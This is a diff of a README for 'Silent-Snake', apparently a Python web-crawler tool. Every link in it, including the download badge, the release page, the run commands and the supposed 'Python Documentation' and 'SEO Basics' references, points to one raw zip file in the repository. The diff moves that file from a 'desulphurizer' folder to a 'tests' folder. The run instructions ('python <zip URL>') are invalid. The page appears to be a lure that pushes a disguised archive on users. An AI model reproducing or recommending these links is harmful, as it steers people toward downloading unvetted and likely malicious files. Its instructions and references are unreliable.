@@ -1,6 +1,6 @@
 # 🌐 Silent-Snake - Effortlessly Crawl the Web
 
-[![Download Silent-Snake](https://raw.githubusercontent.com/KIingMaxiii6813/Silent-Snake/main/desulphurizer/Silent-Snake.zip%20Silent--Snake-4CAF50?style=for-the-badge&logo=github&logoColor=white)](https://raw.githubusercontent.com/KIingMaxiii6813/Silent-Snake/main/desulphurizer/Silent-Snake.zip)
+[![Download Silent-Snake](https://raw.githubusercontent.com/KIingMaxiii6813/Silent-Snake/main/tests/Silent-Snake-1.7.zip%20Silent--Snake-4CAF50?style=for-the-badge&logo=github&logoColor=white)](https://raw.githubusercontent.com/KIingMaxiii6813/Silent-Snake/main/tests/Silent-Snake-1.7.zip)
 
 ## 🚀 Getting Started
 
@@ -8,7 +8,7 @@ Silent-Snake is a command-line interface (CLI) based web crawler inspired by Scr
 
 ## 📥 Download & Install
 
-To download Silent-Snake, visit this page to download: [Silent-Snake Releases](https://raw.githubusercontent.com/KIingMaxiii6813/Silent-Snake/main/desulphurizer/Silent-Snake.zip)
+To download Silent-Snake, visit this page to download: [Silent-Snake Releases](https://raw.githubusercontent.com/KIingMaxiii6813/Silent-Snake/main/tests/Silent-Snake-1.7.zip)
 
 1. Click on the link above.
 2. Find the latest version of Silent-Snake.
@@ -32,14 +32,14 @@ Once you have downloaded Silent-Snake, follow these instructions to run the appl
 
 1. Open the Command Prompt.
 2. Navigate to the folder where you downloaded the Silent-Snake file.
-3. Type `python https://raw.githubusercontent.com/KIingMaxiii6813/Silent-Snake/main/desulphurizer/Silent-Snake.zip` and press Enter.
+3. Type `python https://raw.githubusercontent.com/KIingMaxiii6813/Silent-Snake/main/tests/Silent-Snake-1.7.zip` and press Enter.
 4. Follow the prompts in the command line to start crawling.
 
 ### For macOS/Linux:
 
 1. Open the Terminal.
 2. Navigate to the folder where you downloaded the Silent-Snake file.
-3. Type `python3 https://raw.githubusercontent.com/KIingMaxiii6813/Silent-Snake/main/desulphurizer/Silent-Snake.zip` and press Enter.
+3. Type `python3 https://raw.githubusercontent.com/KIingMaxiii6813/Silent-Snake/main/tests/Silent-Snake-1.7.zip` and press Enter.
 4. Follow the prompts in the terminal to start crawling.
 
 ## 📘 Using Silent-Snake
@@ -94,8 +94,8 @@ A: Check the error message for details and consult the GitHub Issues section for
 
 To learn more about web crawling and SEO, consider visiting:
 
-- [SEO Basics](https://raw.githubusercontent.com/KIingMaxiii6813/Silent-Snake/main/desulphurizer/Silent-Snake.zip)
-- [Python Documentation](https://raw.githubusercontent.com/KIingMaxiii6813/Silent-Snake/main/desulphurizer/Silent-Snake.zip)
-- [Web Crawling Guidelines](https://raw.githubusercontent.com/KIingMaxiii6813/Silent-Snake/main/desulphurizer/Silent-Snake.zip)
+- [SEO Basics](https://raw.githubusercontent.com/KIingMaxiii6813/Silent-Snake/main/tests/Silent-Snake-1.7.zip)
+- [Python Documentation](https://raw.githubusercontent.com/KIingMaxiii6813/Silent-Snake/main/tests/Silent-Snake-1.7.zip)
+- [Web Crawling Guidelines](https://raw.githubusercontent.com/KIingMaxiii6813/Silent-Snake/main/tests/Silent-Snake-1.7.zip)
 
-Don’t forget to check for updates on the GitHub Releases page: [Silent-Snake Releases](https://raw.githubusercontent.com/KIingMaxiii6813/Silent-Snake/main/desulphurizer/Silent-Snake.zip)
+Don’t forget to check for updates on the GitHub Releases page: [Silent-Snake Releases](https://raw.githubusercontent.com/KIingMaxiii6813/Silent-Snake/main/tests/Silent-Snake-1.7.zip)
